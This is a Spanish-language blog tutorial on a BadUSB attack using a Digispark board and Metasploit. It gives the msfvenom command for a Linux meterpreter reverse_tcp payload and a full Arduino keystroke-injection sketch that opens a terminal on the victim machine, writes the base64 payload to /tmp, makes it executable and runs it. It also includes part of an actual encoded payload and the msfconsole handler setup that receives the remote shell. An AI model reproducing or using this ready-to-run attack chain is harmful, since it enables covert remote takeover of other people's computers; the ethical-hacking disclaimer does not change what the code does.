---
layout: post
title: Basic Exploit with Digispark

---
# Introducción
En el dia de hoy explicaremos como hacer una técnica de explotación básica ayudandonos de Digispark y metasploit framework.
Este post lo he creado en Español para difundir mi idioma y dar a conocer el mundo de la seguridad informática en Español.
Para comenzar necesitaremos lo siguiente:  
  - Digispark: [amazon](https://www.amazon.es/AZDelivery-Digispark-Kickstarter-Desarrollo-compatible/dp/B076KS2QDS/ref=asc_df_B076KS2QDS/?tag=googshopes-21&linkCode=df0&hvadid=301006161094&hvpos=1o1&hvnetw=g&hvrand=3258160503763513062&hvpone=&hvptwo=&hvqmt=&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=9047059&hvtargid=pla-602427609241&psc=1)
  - Disposición Linux, en mi caso uso ubuntu 18.04
  - Metasploit Framework
  
Cabe mencionar que necesitamos comprar el Digispark, yo lo compré en Amazon, 3 por casi 10 euros y sin duda merece la pena, se puede hacer
tales cantidades de proyectos..

Todo lo que explico es con fines educativos, no me hago responsable del mal uso que le hagais a este post, simplemente me gusta enseñar las habilidades de hacking ético que conozco con el fin de que aprendais como podeis ser atacados y saber defenderos.

# Construyendo el exploit
Para crear el exploit debemos usar la herramienta msfvenom y excribir la siguiente linea de código: 

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP A USAR) LPORT=(PUERTO A USAR) -f elf > exploit`

Como podemos observar lo que crearemos es un exploit el cual, al ejecutarse en el equipo victima (con distribución linux) nos abrirá una conexión tcp
la cual nos permitirá infectar el equipo y con meterpreter poder acceder a todos sus archivos. 
En la IP cada uno pondra su ip, se puede mirar abriendo la terminal y escribiendo el siguiente comando `ifconfig`, dependiendo si teneis vuestro computador enchufado por cable o lo teneis inalámbrico estará en una interfaz o otra. Esa IP es privada, es decir, solo os servirá para vuestra propia red, no obstante se puede crear este exploit y sacarlo fuera de la red local(LAN), pero eso lo dejaré para otro post. Dicho esto yo usaré mi IP privada y un puerto efímero, el 5000 por ejemplo.

![Foto1](/images/foto1.png)
 
Bien, para terminar de construir este exploit hay que tranformarlo a base64 para poder ejecutarlo directamente en la computadora víctima, asique escribiremos lo siguiente: `base64 exploit > exploit.b64`. Podemos comprobar que ha sido construido satisfactoriamente con el comando `cat exploit.b64`.

![Foto2](/images/foto2.png)

# Creando el script para Digispark
Bien, ahora pasemos a lo interesante de este post, crearemos un script en Arduino que nos permita crear un archivo b64 en la computadora victima, darle los permisos de ejecución con chmod y ejecutarlo para poder explotar el sistema. Para ello como ya he dicho nos apoyaremos en Arduino, para ponerlo en funcionamiento debereis descargarlo en la pagina oficial [arduino](https://www.arduino.cc/en/Main/Software) . Posteriormente en el arduino nos iremos a `Herramientas->Placa->Gestor de Tarjetas` y instalaremos `Digistump AVR boards`, por último en placa ya seleccionaremos `Digispark(Default - 16.5mhz)` y Fiuh listo ya podemos ponernos manos a la obra y empezar a crear nuestros primeros script para el Digispark. Como todos sabeis Arduino consta de dos funciones setup() en la cual inicializaremos los pines y cualquier otra cosa, se puede dejar en blanco y la función loop() que se repetira constantemente. Empezaremos con las lineas `#include "DigiKeyboard.h"` para poder trabajar con DigiKeyboard, que nos permitirá simular un teclado con el Digispark.
Yo os facilitaré el código que he creado para ejecutar el script en el ordenador víctima.
{% highlight c++ %}
#include "DigiKeyboard.h"
#define KEY_DELETE 0x4C
void setup() {
  
// Encendemos el LED para saber que se esta ejecutando
pinMode(1, OUTPUT);
delay(200);
digitalWrite(1, HIGH);
DigiKeyboard.sendKeyStroke(KEY_DELETE);
delay(200);

//Abrimos el buscador y escribimos terminal
DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); 
DigiKeyboard.delay(1000);
DigiKeyboard.print("terminal");
DigiKeyboard.delay(500);

// Creamos el payload
DigiKeyboard.print("echo");
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.print("TU PAYLOAD");
DigiKeyboard.sendKeyStroke(KEY_1,MOD_ALT_RIGHT);
DigiKeyboard.print(" base64 //decode ");
DigiKeyboard.sendKeyStroke(100,2);
DigiKeyboard.print(" ");
DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
DigiKeyboard.print("tmp");
DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
DigiKeyboard.print("exploit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);

// Cambiamos los permisos para poder ejecutarlo y lo ejecutamos
DigiKeyboard.print("chmod 755");
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
DigiKeyboard.print("tmp");
DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
DigiKeyboard.print("exploit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
// Ejecutamos
DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
DigiKeyboard.print("tmp");
DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
DigiKeyboard.print("exploit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);

DigiKeyboard.delay(100);
// Paramos el led
digitalWrite(1, LOW);

}

void loop() {
// Para saber que el script se ha ejecutado con exito, mantendremos el led encendiendose y apagandose

digitalWrite(1, HIGH);
delay(200);

digitalWrite(1, LOW);
delay(300);

}
{% endhighlight %}
Bien, el código es un poco enrevesado, pero después de darle unas vueltas os dareis cuenta de que lo único que hace es: Encender el led rojo fijo, abrir la terminal, escribir el payload generado y guardarlo en un archivo, cambiarle los permisos y ejecutarlo, para terminar pone el led intermitente. Es simplemente eso.
Puedo comentaros algunos problemillas que he tenido, mi payload tenia una barra invertida entre medias entonces he tenido que dividir el print, y la barra la he puesto con la combinación de teclas que corresponde, puesto que si la escribía en el print daba errores con el teclado y no se escribia una / si no un - . Por eso en mi caso me quedaría asi ese trozo:
{% highlight c++ %}
DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKhkFGgCABOIieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av");
DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
DigiKeyboard.print("huAEAAAC7AQAAAM2A ");
{% endhighlight %}
Ahi apreciais como separo el payload, escribo la barra `/` y ya continuo. Os menciono esto por si, a la hora de escribir vuestro payload, como evidentemente el valor cambia, os adelanto este problema.
Para terminar esta parte, verificaremos nuestro programa, le daremos a subir y introduciremos el Digispark. Una vez subido podemos desenchufarlo y ya preparar la siguiente parte que es configurar metasploit. ¡¡Ya queda poco!!

# Configurando msfconsole
Llegados hasta aqui, ahora solo nos queda la parte divertida, configuraremos msfconsole para que se ponga a la escucha de conexiones TCP y explotar el sistema cuando se ejecute el payload en el equipo víctima. bien empezemos:
  - Ejecutamos en una terminal msfconsole -q (-q es para que no nos aparezca el banner)
  - Ejecutamos `use exploit/multi/handler` para seleccionar el exploit.
  - Ahora pasemos a configurar los parametros, pondremos set LHOST (NUESTRA IP) en mi caso: `set LHOST 192.168.100.20`.
  - Posteriormente establecemos el puerto que pusimos en el payload, en mi caso el 5000: `set LPORT 5000`.
  - Por ultimo seleccionamos el PAYLOAD que usamos anteriormente: `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, y los datos que pusimos anteriormente se cargaran alli.
  
Siempre podemos usar `show options` para ver si hemos configurado correctamente todo.
  
![foto3](/images/foto3.png)
  
Llegados a este punto ya podriamos probar si funciona nuestra prueba...

# Exploit...

Bien, por fin hemos llegado a la prueba de la verdad, es hora de enchufar nuestro Digispark al ordenador y ver si funciona, no obstante antes hay que poner meterpreter a la escucha, asique teclearemos en nuestra msfconsole: `exploit`, y ya se pondra a la escucha de la conexion TCP.

Aqui os dejo un pequeño video de lo que ocurre al enchufar nuestro Digispark, espero que os haya gustado, cualquier duda dejenmelo saber enviandome un mail.

  
